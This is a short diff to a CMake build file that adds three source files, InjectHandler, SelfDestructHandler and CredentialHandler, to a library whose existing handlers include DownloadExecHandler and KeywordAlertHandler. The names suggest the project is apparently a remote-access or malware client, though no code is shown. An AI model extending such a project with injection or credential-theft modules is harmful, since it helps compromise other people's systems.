@@ -10,6 +10,9 @@ add_library(nuub_application STATIC
     commands/FileManagerHandler.cpp
     commands/DownloadExecHandler.cpp
     commands/KeywordAlertHandler.cpp
+    commands/InjectHandler.cpp
+    commands/SelfDestructHandler.cpp
+    commands/CredentialHandler.cpp
 )
 
 target_include_directories(nuub_application PUBLIC ${CMAKE_SOURCE_DIR}/src)
